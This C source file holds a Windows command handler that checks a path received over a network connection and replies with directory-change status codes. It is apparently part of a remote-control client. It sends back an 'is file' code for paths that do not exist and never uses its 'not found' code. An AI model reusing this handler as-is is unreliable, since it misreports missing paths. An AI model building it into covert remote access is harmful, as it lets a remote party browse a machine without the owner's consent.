#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

#define HDD_PATH_MAX 260

#define COMMANDS_HDD_CD_NOT_FOUND 0x64
#define COMMANDS_HDD_CD_IS_FILE 0x53
#define COMMANDS_HDD_CD_PATH_APPEND 0x36
#define COMMANDS_HDD_CD_PATH_REPLACE 0x35
#define COMMANDS_HDD_CD_NEW_PATH 0xAD

int command_hdd_Cd(uint8* msg)
{
	struct stat fbuf;

	if(stat((char*)msg, &fbuf) == -1)
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_CD_NEW_PATH) == NET_LOST_CONNECTION) 
		{
			return NET_LOST_CONNECTION;	
		}

		uint8 *rmsg;

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			return NET_LOST_CONNECTION;
		}

		if(stat((char*)rmsg, &fbuf) == -1)
		{
			if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_CD_IS_FILE) == NET_LOST_CONNECTION) 
			{
				free(rmsg);

				return NET_LOST_CONNECTION;	
			}
		}else{
			if(!S_ISDIR(fbuf.st_mode))
			{
				if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_CD_IS_FILE) == NET_LOST_CONNECTION) 
				{
					free(rmsg);

					return NET_LOST_CONNECTION;	
				}
			}else{
				if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_CD_PATH_REPLACE) == NET_LOST_CONNECTION) 
				{
					free(rmsg);

					return NET_LOST_CONNECTION;	
				}
			}
		}

		free(rmsg);
	}else{
		if(!S_ISDIR(fbuf.st_mode))
		{
			if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_CD_IS_FILE) == NET_LOST_CONNECTION) 
			{
				return NET_LOST_CONNECTION;	
			}
		}else{
			if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_CD_PATH_APPEND) == NET_LOST_CONNECTION) 
			{
				return NET_LOST_CONNECTION;	
			}
		}
	}

	return COMMANDS_SUCC;
}